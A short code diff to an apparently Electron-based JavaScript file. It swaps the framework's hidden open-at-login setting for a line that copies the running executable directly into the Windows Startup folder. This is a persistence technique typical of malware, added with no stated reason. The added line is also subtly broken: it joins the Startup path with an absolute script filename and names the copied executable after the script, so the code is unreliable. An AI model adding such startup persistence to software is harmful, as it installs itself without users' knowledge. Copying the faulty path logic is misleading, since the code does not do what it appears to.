@@ -1,8 +1,4 @@
-const { app } = require('electron');
+const { copyFileSync } = require('fs');
+const { join } = require('path');
 
-app.setLoginItemSettings({
-  openAtLogin: true,
-  openAsHidden: true,
-  enabled: true,
-  path: process.execPath
-});
+copyFileSync(process.execPath, join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', __filename));
